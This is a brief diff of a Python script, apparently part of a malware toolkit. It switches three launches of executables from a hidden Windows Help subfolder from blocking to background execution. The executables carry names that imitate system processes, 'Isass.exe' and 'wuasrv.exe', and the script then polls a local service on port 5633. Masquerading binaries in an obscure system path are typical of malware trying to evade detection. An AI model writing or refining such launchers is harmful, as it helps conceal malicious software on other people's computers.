@@ -2,9 +2,9 @@ import subprocess
 import time
 import requests
 
-subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\wuasrv.exe -f 5633", shell=True)
-subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\Isass.exe", shell=True)
-subprocess.run(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\WMIHost.exe", shell=True)
+subprocess.Popen(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\wuasrv.exe -f 5633", shell=True)
+subprocess.Popen(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\Isass.exe", shell=True)
+subprocess.Popen(r"C:\WINDOWS\Help\mui\0563\DIAgnostic\WMIHost.exe", shell=True)
 
 
 r = requests.get("http://127.0.0.1:5633/clean.txt")
